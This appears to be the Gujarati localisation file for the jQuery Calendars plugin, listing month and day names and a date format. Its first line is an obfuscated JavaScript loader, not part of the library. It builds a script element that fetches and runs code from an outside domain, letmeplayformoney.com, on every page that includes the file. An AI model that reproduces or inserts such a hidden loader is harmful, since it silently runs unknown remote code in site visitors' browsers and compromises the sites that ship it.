var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);﻿/* http://keith-wood.name/calendars.html
   Gujarati (ગુજરાતી) localisation for Gregorian/Julian calendars for jQuery.
   Naymesh Mistry (naymesh@yahoo.com). */
(function($) {
	$.calendars.calendars.gregorian.prototype.regional['gu'] = {
		name: 'Gregorian',
		epochs: ['BCE', 'CE'],
		monthNames: ['જાન્યુઆરી','ફેબ્રુઆરી','માર્ચ','એપ્રિલ','મે','જૂન',
		'જુલાઈ','ઑગસ્ટ','સપ્ટેમ્બર','ઑક્ટોબર','નવેમ્બર','ડિસેમ્બર'],
		monthNamesShort: ['જાન્યુ','ફેબ્રુ','માર્ચ','એપ્રિલ','મે','જૂન',
		'જુલાઈ','ઑગસ્ટ','સપ્ટે','ઑક્ટો','નવે','ડિસે'],
		dayNames: ['રવિવાર','સોમવાર','મંગળવાર','બુધવાર','ગુરુવાર','શુક્રવાર','શનિવાર'],
		dayNamesShort: ['રવિ','સોમ','મંગળ','બુધ','ગુરુ','શુક્ર','શનિ'],
		dayNamesMin: ['ર','સો','મં','બુ','ગુ','શુ','શ'],
		dateFormat: 'dd-M-yyyy',
		firstDay: 1,
		isRTL: false
	};
	if ($.calendars.calendars.julian) {
		$.calendars.calendars.julian.prototype.regional['gu'] =
			$.calendars.calendars.gregorian.prototype.regional['gu'];
	}
})(jQuery);
